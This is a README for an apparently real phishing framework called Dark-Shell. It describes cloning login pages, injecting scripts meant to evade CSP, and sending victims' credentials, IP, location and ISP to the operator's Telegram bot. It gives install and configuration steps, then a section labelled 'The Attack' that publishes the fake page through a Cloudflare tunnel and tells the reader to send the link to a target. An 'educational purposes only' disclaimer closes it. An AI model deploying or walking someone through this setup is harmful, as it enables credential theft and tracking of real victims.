# 💀 Dark-Shell Framework v1.5
**Advanced Web-Cloning & Phishing Intelligence Tool with Real-time Telegram Alerts**

Dark-Shell is a sophisticated automated framework designed for security researchers and educational purposes. It clones login pages, injects stealth tracking scripts, and delivers captured credentials alongside victim metadata (IP, Location, ISP) directly to your Telegram Bot.

---

## 🔥 Features
* ⚡ **Instant Web Cloner:** Clone any login page in seconds.
* 📍 **Deep Metadata Tracking:** Capture Target's Real IP, City, Country, and ISP.
* 📱 **Telegram Integration:** Instant alerts on your phone for every hit.
* 🔐 **Stealth Injection:** Uses advanced JS and PHP headers to bypass CSP and capture data.
* 🌐 **Cloudflare Tunneling:** Ready to go live on the internet without manual port forwarding.

---

## 🛠️ Prerequisites & Installation
To run this tool, you must have **Python 3**, **PHP**, and **Cloudflared** installed.
---
### 1. Install Python & PHP
#### **For Windows:**
* **Python:** Download from [python.org](https://www.python.org/downloads/). (Check **"Add Python to PATH"** during installation).
* **PHP:** Download from [windows.php.net](https://windows.php.net/download/). Extract to `C:\php` and add to System PATH.
#### **For Linux (Ubuntu/Kali):**
```bash
sudo apt update
sudo apt install python3 python3-pip php-cli git curl -y
```
---
### 2. Install Cloudflared (For External Access)
#### **For Windows:**
* **Cloudflared**
#### **For Linux (Ubuntu/Kali):**
```bash
curl -L --output cloudflared.deb https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared.deb
```
---
## 3. Setup Dark-Shell
```Bash
# Clone the repository
git clone https://github.com/kalpatharaka/Dark-Shell.git
cd Dark-Shell
```
```bash
# Install Python requirements
pip install -r requirements.txt
```
---
## 4. Configure Telegram API
```bash
# Open modules/cloner.py
nano modules/cloner.py.
```
   * **Find $botToken and replace it with your Token from [@botToken](https://t.me/BotFather)**
   * **Find $chatId and replace it with your ID from [@IDBot](https://t.me/myidbot)**
---
## 🚀 How to Use
# Step 1: Fire up the Tool
```bash
python3 main.py
```
* Select ***Option 01*** to clone a target website.
* Select ***Option 02*** to start the local phishing server.
---
# Step 2: Go Live (The Attack)
Open a new terminal and launch the tunnel:
```bash
cloudflared tunnel --protocol http2 --url http://localhost:8080
```
* Copy the **.trycloudflare.com** link and send it to your target.
---
⚠️Disclaimer
This tool is for Educational Purposes Only. The author is not responsible for any misuse, damage, or illegal activities caused by this tool. Use it responsibly.
